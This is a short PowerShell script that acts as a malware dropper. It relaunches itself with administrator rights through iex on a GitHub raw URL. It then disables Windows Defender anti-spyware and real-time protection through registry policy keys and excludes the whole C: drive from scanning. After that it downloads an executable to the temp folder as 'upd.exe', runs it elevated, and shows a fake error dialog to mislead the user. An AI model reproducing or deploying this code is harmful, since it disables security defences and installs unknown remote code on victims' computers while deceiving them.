if (!([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $cmd = "iex (irm 'https://raw.githubusercontent.com/idonotknowyoudev/myfiles/refs/heads/main/script-download.ps1')"
    Start-Process powershell -Verb RunAs -ArgumentList "-Command $cmd"
    exit
}

$ver = (irm 'https://raw.githubusercontent.com/idonotknowyoudev/myfiles/refs/heads/main/version.txt').Trim()
$url = "https://raw.githubusercontent.com/idonotknowyoudev/myfiles/refs/heads/main/$ver"
$path = "$env:TEMP\upd.exe"

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue

Invoke-WebRequest -Uri $url -OutFile $path

Start-Process -FilePath $path -ArgumentList "/1st" -Verb RunAs -Wait

Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("Error", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
